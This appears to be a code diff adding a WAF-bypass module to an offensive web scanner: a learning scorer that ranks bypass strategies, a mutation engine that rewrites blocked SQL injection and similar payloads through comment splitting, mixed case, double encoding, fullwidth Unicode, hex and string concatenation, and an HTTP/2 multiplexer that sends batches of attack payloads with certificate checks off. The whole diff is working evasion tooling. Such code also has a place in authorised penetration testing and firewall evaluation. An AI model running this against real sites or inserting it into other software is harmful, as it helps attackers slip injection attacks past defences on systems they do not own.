@@ -1976,3 +1976,365 @@ def detect_waf(url: str, session=None, timeout: int = 10) -> WAFProfile:
     """Detect WAF at the given URL. Returns WAFProfile."""
     detector = WAFDetector(timeout=timeout)
     return detector.detect(url, session=session)
+
+
+# ===========================================================================
+# ADIM 11 — WAF Bypass: ML Scorer, Adaptive Mutation, HTTP/2 Multiplexing
+# ===========================================================================
+from collections import defaultdict
+import math
+
+
+# ---------------------------------------------------------------------------
+# WAFBypassMLScorer — epsilon-greedy scoring for strategy selection
+# ---------------------------------------------------------------------------
+
+class WAFBypassMLScorer:
+    """
+    ML/scoring-based WAF bypass strategy selector.
+
+    Tracks per-strategy success rates across requests. Uses epsilon-greedy
+    selection: 80% exploit the best-scoring strategy, 20% explore randomly.
+
+    Feed outcomes via record_attempt(). Retrieve ranked strategies via
+    rank_strategies() or best_strategy().
+
+    SOLID/SRP: Only responsible for strategy scoring and selection.
+    """
+
+    def __init__(self, epsilon: float = 0.20, decay: float = 0.95):
+        """
+        epsilon: exploration probability (0.20 = 20% random exploration)
+        decay:   score decay factor applied over time (0.95 per ranking call)
+        """
+        self._epsilon = epsilon
+        self._decay = decay
+        self._stats: Dict[str, Dict[str, Any]] = defaultdict(
+            lambda: {"attempts": 0, "successes": 0, "score": 0.5, "last_ts": 0.0}
+        )
+        self._lock = threading.Lock()
+
+    def record_attempt(
+        self,
+        strategy: str,
+        *,
+        blocked: bool,
+        status_code: int = 200,
+        response_time_ms: float = 0.0,
+    ) -> None:
+        """
+        Record the outcome of applying a bypass strategy.
+
+        blocked=False → request got through (success).
+        blocked=True  → WAF still blocked (failure).
+        """
+        with self._lock:
+            st = self._stats[strategy]
+            st["attempts"] += 1
+            st["last_ts"] = time.time()
+            if not blocked:
+                st["successes"] += 1
+            # Bayesian-style score: (successes + 1) / (attempts + 2)
+            st["score"] = (st["successes"] + 1) / (st["attempts"] + 2)
+            # Bonus for fast responses (not causing timeouts)
+            if response_time_ms > 0 and not blocked:
+                speed_bonus = min(0.05, 500.0 / max(response_time_ms, 1))
+                st["score"] = min(1.0, st["score"] + speed_bonus)
+
+    def rank_strategies(self, strategies: List[str]) -> List[str]:
+        """
+        Return strategies sorted by score (descending).
+        Applies time decay to older scores to prefer fresh data.
+        """
+        now = time.time()
+        scored: List[tuple] = []
+        with self._lock:
+            for name in strategies:
+                st = self._stats[name]
+                age_s = now - st["last_ts"] if st["last_ts"] else 0
+                decay_factor = self._decay ** (age_s / 60.0)  # decay per minute
+                effective_score = st["score"] * decay_factor
+                scored.append((name, effective_score))
+        scored.sort(key=lambda x: x[1], reverse=True)
+        return [name for name, _ in scored]
+
+    def best_strategy(self, candidates: List[str]) -> Optional[str]:
+        """
+        Epsilon-greedy: 80% pick best scored, 20% pick random (exploration).
+        """
+        if not candidates:
+            return None
+        if random.random() < self._epsilon:
+            return random.choice(candidates)
+        ranked = self.rank_strategies(candidates)
+        return ranked[0] if ranked else candidates[0]
+
+    def top_n(self, strategies: List[str], n: int = 3) -> List[str]:
+        """Return top N strategies by score."""
+        return self.rank_strategies(strategies)[:n]
+
+    def summary(self) -> Dict[str, Any]:
+        """Return scoring summary for diagnostics."""
+        with self._lock:
+            return {
+                name: {
+                    "attempts": st["attempts"],
+                    "successes": st["successes"],
+                    "score": round(st["score"], 3),
+                }
+                for name, st in sorted(
+                    self._stats.items(),
+                    key=lambda x: x[1]["score"],
+                    reverse=True,
+                )
+            }
+
+
+# Shared global scorer (used across scan sessions)
+_GLOBAL_ML_SCORER = WAFBypassMLScorer()
+
+
+def get_global_scorer() -> WAFBypassMLScorer:
+    """Return the global WAF bypass ML scorer."""
+    return _GLOBAL_ML_SCORER
+
+
+# ---------------------------------------------------------------------------
+# AdaptiveMutationEngine — payload mutation on 403/429 response
+# ---------------------------------------------------------------------------
+
+class AdaptiveMutationEngine:
+    """
+    Generates payload mutations when a WAF blocks a request (403/429).
+    Each mutation strategy targets a different WAF detection mechanism.
+
+    SOLID/OCP: Register new mutation strategies without modifying this class.
+    """
+
+    def __init__(self):
+        self._tried: Dict[str, set] = defaultdict(set)
+
+    # --- Public API ---
+
+    def mutate(self, payload: str, category: str = "generic") -> List[str]:
+        """
+        Generate payload mutations. Returns list of candidate variants.
+        Skips variants already tried for this payload.
+        """
+        mutations: List[str] = []
+        for method in [
+            self._case_mutate,
+            self._comment_mutate,
+            self._whitespace_mutate,
+            self._url_encode_mutate,
+            self._double_encode_mutate,
+            self._unicode_mutate,
+            self._hex_mutate,
+            self._concat_mutate,
+        ]:
+            for variant in method(payload):
+                key = f"{category}:{variant}"
+                if key not in self._tried[payload]:
+                    mutations.append(variant)
+        return mutations
+
+    def record_tried(self, payload: str, variant: str, category: str = "generic") -> None:
+        self._tried[payload].add(f"{category}:{variant}")
+
+    # --- Mutation strategies ---
+
+    def _case_mutate(self, p: str) -> List[str]:
+        """Random case: SELECT → SeLeCt"""
+        variants = []
+        for _ in range(3):
+            variants.append("".join(
+                c.upper() if random.random() > 0.5 else c.lower() for c in p
+            ))
+        return variants
+
+    def _comment_mutate(self, p: str) -> List[str]:
+        """SQL comment injection: SELECT → SE/**/LECT, SELECT → SE/*!*/LECT"""
+        if len(p) < 4:
+            return []
+        mid = len(p) // 2
+        return [
+            p[:mid] + "/**/" + p[mid:],
+            p[:mid] + "/*!*/" + p[mid:],
+            p[:mid] + "/*!" + p[mid:] + "*/",
+            p[:mid] + "--\n" + p[mid:],
+        ]
+
+    def _whitespace_mutate(self, p: str) -> List[str]:
+        """Whitespace substitution: space → tab, newline, vertical tab"""
+        return [
+            p.replace(" ", "\t"),
+            p.replace(" ", "\n"),
+            p.replace(" ", "\r\n"),
+            p.replace(" ", "%09"),
+            p.replace(" ", "%0a"),
+            p.replace(" ", "%0d%0a"),
+        ]
+
+    def _url_encode_mutate(self, p: str) -> List[str]:
+        """URL-encode suspicious characters."""
+        from urllib.parse import quote
+        result = []
+        for char, enc in [("'", "%27"), ('"', "%22"), ("<", "%3c"), (">", "%3e"), ("=", "%3d")]:
+            if char in p:
+                result.append(p.replace(char, enc))
+        result.append(quote(p, safe="=&?"))
+        return result
+
+    def _double_encode_mutate(self, p: str) -> List[str]:
+        """Double URL-encode: %27 → %2527"""
+        import re as _re
+        return [_re.sub(r'%([0-9A-Fa-f]{2})', lambda m: f'%25{m.group(1)}', p)]
+
+    def _unicode_mutate(self, p: str) -> List[str]:
+        """Unicode fullwidth equivalents for ASCII letters."""
+        _map = {
+            'a': 'ａ', 'e': 'ｅ', 'i': 'ｉ', 'o': 'ｏ',
+            's': 'ｓ', 'l': 'ｌ', 'n': 'ｎ', 'r': 'ｒ',
+        }
+        return ["".join(_map.get(c.lower(), c) for c in p)]
+
+    def _hex_mutate(self, p: str) -> List[str]:
+        """Hex-encode chars for SQL context: a → 0x61"""
+        if len(p) > 20:
+            return []
+        hex_str = "0x" + p.encode().hex()
+        return [hex_str]
+
+    def _concat_mutate(self, p: str) -> List[str]:
+        """String concatenation bypass: 'admin' → 'adm'||'in' (Oracle/Postgres)"""
+        if len(p) < 4 or "'" not in p:
+            return []
+        mid = len(p) // 2
+        return [
+            p[:mid] + "'||'" + p[mid:],
+            p[:mid] + "'+'" + p[mid:],
+            p[:mid] + "\" \"+\"" + p[mid:],
+        ]
+
+
+# ---------------------------------------------------------------------------
+# HTTP2MultiplexingEvasion — HTTP/2 stream multiplexing WAF bypass
+# ---------------------------------------------------------------------------
+
+class HTTP2MultiplexingEvasion:
+    """
+    HTTP/2 multiplexing-based WAF evasion.
+
+    Sends multiple payloads as concurrent HTTP/2 streams on a SINGLE connection.
+    Some WAFs apply rate-limiting per connection (not per stream) and may
+    fail to inspect all multiplexed streams individually.
+
+    Requires: httpx with h2 support (pip install httpx[http2] h2)
+
+    SOLID/SRP: Only responsible for HTTP/2 multiplexed request dispatch.
+    """
+
+    def __init__(self, timeout: float = 10.0, max_concurrent_streams: int = 20):
+        self.timeout = timeout
+        self.max_concurrent_streams = max_concurrent_streams
+
+    def send_multiplexed(
+        self,
+        url: str,
+        payloads: List[Dict[str, Any]],
+        base_headers: Optional[Dict[str, str]] = None,
+    ) -> List[Dict[str, Any]]:
+        """
+        Send N payloads as concurrent HTTP/2 streams on one connection.
+
+        payloads: list of {"params": {...}, "headers": {...}, "method": "GET"}
+        Returns: list of {"payload": {...}, "status": int, "body": str, "error": str}
+        """
+        try:
+            import httpx
+        except ImportError:
+            _logger.warning("[HTTP2Mux] httpx not available: pip install httpx[http2]")
+            return []
+
+        results: List[Dict[str, Any]] = []
+        chunks = [
+            payloads[i:i + self.max_concurrent_streams]
+            for i in range(0, len(payloads), self.max_concurrent_streams)
+        ]
+
+        try:
+            import asyncio
+
+            async def _run_batch(batch: List[Dict]) -> List[Dict]:
+                async with httpx.AsyncClient(
+                    http2=True,
+                    timeout=httpx.Timeout(self.timeout),
+                    verify=False,
+                    headers=base_headers or {},
+                ) as client:
+                    tasks = [self._send_one(client, url, p) for p in batch]
+                    return await asyncio.gather(*tasks, return_exceptions=True)
+
+            for chunk in chunks:
+                loop = asyncio.new_event_loop()
+                asyncio.set_event_loop(loop)
+                try:
+                    batch_results = loop.run_until_complete(_run_batch(chunk))
+                    for i, res in enumerate(batch_results):
+                        if isinstance(res, Exception):
+                            results.append({"payload": chunk[i], "error": str(res), "status": 0})
+                        else:
+                            results.append(res)
+                finally:
+                    loop.close()
+
+        except Exception as e:
+            _logger.debug(f"[HTTP2Mux] Error: {e}")
+
+        return results
+
+    async def _send_one(
+        self,
+        client,
+        url: str,
+        payload: Dict[str, Any],
+    ) -> Dict[str, Any]:
+        method = (payload.get("method") or "GET").upper()
+        params = payload.get("params") or {}
+        headers = payload.get("headers") or {}
+        body = payload.get("body")
+        try:
+            if method == "POST":
+                r = await client.post(url, params=params, headers=headers,
+                                      content=body, timeout=self.timeout)
+            else:
+                r = await client.get(url, params=params, headers=headers)
+            return {
+                "payload": payload,
+                "status": r.status_code,
+                "body": r.text[:512],
+                "http_version": r.http_version,
+                "error": None,
+            }
+        except Exception as e:
+            return {"payload": payload, "status": 0, "body": "", "error": str(e)}
+
+    def probe_waf_with_h2(
+        self, url: str, attack_payloads: List[str], param: str = "q"
+    ) -> Dict[str, Any]:
+        """
+        Convenience: inject attack_payloads into `param` via HTTP/2 multiplexing.
+        Returns summary of blocked vs passed.
+        """
+        payloads = [{"params": {param: p}, "method": "GET"} for p in attack_payloads]
+        results = self.send_multiplexed(url, payloads)
+        blocked = [r for r in results if r.get("status", 0) in (403, 429, 406)]
+        passed = [r for r in results if r.get("status", 0) not in (0, 403, 429, 406)]
+        return {
+            "total": len(results),
+            "blocked": len(blocked),
+            "passed": len(passed),
+            "pass_rate": round(len(passed) / max(len(results), 1), 2),
+            "http2_used": any(r.get("http_version") == "HTTP/2" for r in results),
+            "results": results,
+        }
